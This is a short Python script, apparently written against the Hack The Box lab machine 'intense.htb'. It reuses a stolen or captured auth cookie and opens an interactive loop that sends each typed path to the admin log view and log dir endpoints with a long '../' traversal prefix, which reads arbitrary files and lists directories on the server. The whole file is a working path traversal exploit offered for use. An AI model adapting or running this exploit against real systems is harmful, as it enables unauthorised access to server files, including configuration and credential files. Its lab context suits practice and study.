#!/usr/bin/python3
import requests
import sys

headers = { "Host": "intense.htb",
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Content-Type": 'application/x-www-form-urlencoded',
"Connection": "close",
"Cookie" : f"auth={sys.argv[1]}",
"Upgrade-Insecure-Requests": "1",
"Cache-Control": "max-age=0"
}

while True:
    name = input("Kaushik's Shell$ ")
    if name[-1] != '/':
        url = "http://intense.htb/admin/log/view"
        data = f"logfile=../../../../../../../../../../../{name}"
    else:
        url = "http://intense.htb/admin/log/dir"
        data = f"logdir=../../../../../../../../../../../{name}"
    try:
        result = requests.post(url,data=data,headers=headers).text
        if result[0] == '[':
            result = result[1:-1].split(',')
            print('\n'.join(list(i[i.index('\'')+1:-1] for i in result)))
        else:
            print(result)
    except:
        continue




